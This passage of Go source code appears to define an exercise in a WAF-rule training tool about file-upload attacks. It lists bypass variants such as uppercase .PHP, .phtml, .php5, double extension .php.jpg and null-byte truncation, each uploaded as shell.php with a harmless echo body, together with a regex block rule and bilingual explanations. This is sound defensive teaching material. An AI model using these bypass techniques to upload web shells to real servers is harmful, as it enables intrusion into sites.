			T(".php のあとに続くのが . か \" か %00 (ヌル文字の書き方) のときだけを対象にすると、php-guide のような名前を止めずに済みます。",
				"Targeting only cases where .php is followed by ., \", or %00 (a way of writing a null byte) keeps names like php-guide from being blocked."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (.php)", "The PoC as published (.php)"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.php", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Attack, T("大文字の拡張子", "Uppercase extension"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.PHP", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Attack, T(".phtml", ".phtml"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.phtml", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Attack, T(".php5", ".php5"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.php5", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Attack, T("二重拡張子 (.php.jpg)", "Double extension (.php.jpg)"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.php.jpg", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Attack, T("ヌル文字で拡張子を切る", "Null byte to cut the extension"), 6, func(r *rand.Rand) Request {
				ct, body := multipartUpload("shell.php%00.jpg", "<?php echo 'wafdy-test'; ?>")
				return atk(r, withBody(post(r, "/upload", ""), ct, body))
			}},
			{Benign, T("正規のアップロード", "Legitimate uploads"), 30, func(r *rand.Rand) Request {
				name := pick(r, []string{"photo.jpg", "report.pdf", "php-guide.pdf", "my.photo.png", "notes.txt"})
				ct, body := multipartUpload(name, "see https://example.com/index.php for details")
				return withBody(post(r, "/upload", ""), ct, body)
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-php-upload", w.Regex(`filename="[^"]*\.(php[0-9]?|phtml|phar)(\.|"|%00)`, w.BodyField(), w.Lowercase)),
		SolutionNote: []Text{
			T("filename=\" から閉じる \" までの間 ([^\"]*) で、.php・.php5 などの拡張子のあとに . か \" か %00 が続くものに一致させます。Lowercase で .PHP にも対応します。",
				"Within filename=\" up to the closing \" ([^\"]*), match extensions such as .php or .php5 followed by ., \", or %00. Lowercase also covers .PHP."),
			T("ファイルの中身ではなく filename を見るので、本文に index.php と書かれた正規のファイルは止まりません。php-guide.pdf は .php ではなく php- なので止まりません。",
				"Because it looks at filename rather than the file contents, legitimate files that mention index.php in their text aren't blocked. php-guide.pdf has php-, not .php, so it isn't blocked either."),
			T("WAF での対策は応急処置です。根本的には、アプリで拡張子を許可リストで確認し、実行できない場所に保存します。",
				"The WAF rule is a stopgap. The real fix is for the app to check extensions against an allow list and store uploads where they can't execute."),
		},
		Pitfall: w.Block("pitfall-php-upload", w.Contains(`.php"`, w.BodyField())),
		PitfallNote: []Text{
			T("PoC のとおり .php\" で終わるファイル名を探すルールです。大文字・.phtml・.php5・二重拡張子・ヌル文字のどれもすり抜けます。",
				"This rule looks for file names ending in .php\", as in the PoC. Uppercase, .phtml, .php5, double extensions, and null bytes all slip through."),
		},
	})
}
